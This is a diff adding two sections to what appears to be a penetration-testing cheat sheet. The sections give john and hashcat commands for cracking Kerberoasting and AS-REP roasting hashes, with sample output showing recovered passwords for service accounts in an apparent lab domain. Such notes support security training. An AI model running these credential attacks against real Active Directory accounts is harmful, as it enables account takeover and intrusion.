@@ -19,6 +19,23 @@ ___
 
 To crack password hashes, we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) can help.
 
+### Cracking Kerberoasting Hashes
+Use `--format=krb5tgs --wordlist=wordlist svc_mssql` for **john** or `-a 0 -m 13100 svc_mssql wordlist` for **hashcat**.
+
+```
+root@kali:~# john --format=krb5tgs --wordlist=wordlist svc_mssql
+Cyberb0tic       (svc_mssql$dev.cyberbotic.io)
+```
+
+
+### Cracking AS-REP Roasting Hashes
+Use `--format=krb5asrep --wordlist=wordlist svc_oracle` for **john** or `-a 0 -m 18200 svc_oracle wordlist` for **hashcat**.
+
+```
+root@kali:~# john --format=krb5asrep --wordlist=wordlist svc_oracle
+Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)
+```
+
 
 ### Wordlist
 
